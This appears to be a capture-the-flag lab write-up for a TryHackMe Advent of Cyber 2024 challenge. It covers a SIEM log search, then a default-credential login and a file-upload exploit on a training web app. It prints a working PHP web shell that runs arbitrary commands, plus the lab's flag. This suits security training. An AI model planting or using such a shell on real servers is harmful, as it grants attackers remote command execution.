# ğŸ„ Advent of Cyber 2024 â€“ Day 3  
**Title**: *â€œEven If I Wanted to Go, Their Vulnerabilities Wouldnâ€™t Allow Itâ€*

---

## ğŸ§­ Objective  
Investigate Frosty Pines Resort's Elastic SIEM logs (Blue Team), then recreate the attack on the web app (Red Team) to retrieve the flag.

---

## ğŸ”µ Blue Team: Log Investigation

### âœ… Access Kibana
- Open browser inside Ubuntu VM.
- Navigate to: `http://10.10.207.166:5601`

### ğŸ” SIEM Queries
- Selected Index: `frostypines-resorts`
- Timeframe: Oct 1â€“3, 2024
- Searched for: `"shell.php"`

### ğŸ” Results:
| Question | Answer |
|---------|--------|
1-| Where was the web shell uploaded? | `/media/images/rooms/shell.php` |
2-| What IP accessed the shell? | `10.11.83.34` |

---

## ğŸ”´ Red Team: Exploitation

### âœï¸ Step 1: Add Host Resolution
```bash
echo "10.10.207.166 frostypines.thm" | sudo tee -a /etc/hosts
```

### ğŸ” Step 2: Login to Admin Console
- URL: `http://frostypines.thm`
- **Username**: `admin@frostypines.thm`
- **Password**: `admin`

### ğŸ’‰ Step 3: Upload Malicious Web Shell
Under â€œAdd Room,â€ upload a file named `shell.php` with contents:
```php
<html><body>
<form method="GET">
<input type="text" name="command" autofocus size="50">
<input type="submit" value="Execute">
</form>
<pre><?php if (isset($_GET['command'])) { system($_GET['command'] . ' 2>&1'); } ?></pre>
</body></html>
```

> The server may rename it to `.jpg`, but can still execute as `.php`

---

### ğŸš€ Step 4: Access Shell
Browse to:
```
http://frostypines.thm/media/images/rooms/shell.php
```

Execute commands like:
```bash
?command=ls
?command=cat flag.txt
```

---

## ğŸ FLAG
```text
3-THM{Gl1tch_Was_H3r3}
```

---

## âš ï¸ Troubleshooting Challenges

- VPN tunnel dropping â†’ Reconnect via OpenVPN
- Kibana not loading â†’ Restart target machine from THM dashboard
- Web shell not working â†’ Rename file, verify upload path
- Permission issues with `/etc/hosts` â†’ Use `sudo tee -a`
- `find` command noisy â†’ Add `2>/dev/null` or use root access

---

## ğŸ“š References
- [Advent of Cyber Day 3 Blog](https://medium.com/@araman99/advent-of-cyber-2024-day-3-even-if-i-wanted-to-go-their-vulnerabilities-wouldnt-allow-it-a7b8e93317d1)
- Elastic SIEM Logs
- TryHackMe Training Room

---

## âœï¸ Analyst Notes
- Demonstrates insecure file upload vulnerability
- Web app lacks content-type and extension validation
- Default admin credentials used â€” critical authentication failure
- Strong case for adding server-side MIME checks + firewall rules

---
